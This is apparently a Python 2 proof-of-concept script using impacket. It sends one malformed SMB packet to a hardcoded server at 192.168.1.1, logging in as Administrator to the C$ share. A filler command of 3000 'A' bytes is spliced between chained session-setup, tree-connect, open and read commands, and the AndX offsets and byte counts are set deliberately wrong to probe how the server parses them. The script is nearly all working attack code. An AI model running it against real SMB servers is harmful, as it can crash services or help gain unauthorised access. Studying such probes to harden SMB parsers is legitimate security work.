from impacket import smb
import os

class lotsSMB(smb.SMB):
    def do_lots(self, user, pwd_ansi, share, filename, domain = ''):
	pkt = smb.NewSMBPacket()
	pkt['Flags1']  = 8
	
	sessionSetup = smb.SMBCommand(self.SMB_COM_SESSION_SETUP_ANDX)
	sessionSetup['Parameters'] = smb.SMBSessionSetupAndX_Parameters()
	sessionSetup['Data']       = smb.SMBSessionSetupAndX_Data()

	sessionSetup['Parameters']['MaxBuffer']        = 65535
	sessionSetup['Parameters']['MaxMpxCount']      = 2
	sessionSetup['Parameters']['VCNumber']         = os.getpid()
	sessionSetup['Parameters']['SessionKey']       = self.get_session_key()
	sessionSetup['Parameters']['AnsiPwdLength']    = len(pwd_ansi)
	sessionSetup['Parameters']['UnicodePwdLength'] = len('')
	sessionSetup['Parameters']['Capabilities']     = self.CAP_RAW_MODE

	sessionSetup['Data']['AnsiPwd']       = pwd_ansi
	sessionSetup['Data']['UnicodePwd']    = ''
	sessionSetup['Data']['Account']       = str(user)
	sessionSetup['Data']['PrimaryDomain'] = str(domain)
	sessionSetup['Data']['NativeOS']      = str(os.name)
	sessionSetup['Data']['NativeLanMan']  = 'pysmb'

	# This is an example of how to use chained ANDX commands
	
	treeConnect = smb.SMBCommand(self.SMB_COM_TREE_CONNECT_ANDX)
	treeConnect['Parameters'] = smb.SMBTreeConnectAndX_Parameters()
	treeConnect['Data']       = smb.SMBTreeConnectAndX_Data()
	treeConnect['Parameters']['PasswordLength'] = 1
	treeConnect['Data']['Password'] = '\x00'
	treeConnect['Data']['Path'] = share
	treeConnect['Data']['Service'] = smb.SERVICE_ANY

	openFile = smb.SMBCommand(self.SMB_COM_OPEN_ANDX)
	openFile['Parameters'] = smb.SMBOpenAndX_Parameters()
	openFile['Parameters']['DesiredAccess']    = smb.SMB_ACCESS_READ
	openFile['Parameters']['OpenMode']         = smb.SMB_O_OPEN
	openFile['Parameters']['SearchAttributes'] = 0
	openFile['Data']       = smb.SMBOpenAndX_Data()
	openFile['Data']['FileName'] = filename

	readAndX = smb.SMBCommand(self.SMB_COM_READ_ANDX)
	readAndX['Parameters'] = smb.SMBReadAndX_Parameters()
	readAndX['Parameters']['Offset'] = 0
	readAndX['Parameters']['Fid'] = 0
	readAndX['Parameters']['MaxCount'] = 4000

	crap = smb.SMBCommand(0)
	crap['Parameters'] = smb.SMBAndXCommand_Parameters()
	crap['Data'] = 'A'*3000

	pkt.addCommand(sessionSetup)
	pkt.addCommand(crap)
	pkt.addCommand(treeConnect)
	pkt.addCommand(openFile)
	pkt.addCommand(readAndX)

        sessionSetup['Parameters']['AndXCommand'] = crap['Parameters']['AndXCommand']
        sessionSetup['Parameters']['AndXOffset']  = crap['Parameters']['AndXOffset']

	sessionSetup['ByteCount'] = 1000
	treeConnect['ByteCount'] = 100

	self.sendSMB(pkt)

	pkt = self.recvSMB()

s = lotsSMB('*SMBSERVER','192.168.1.1')
s.do_lots('Administrator','password', r'\\*SMBSERVER\C$', r'\gera')

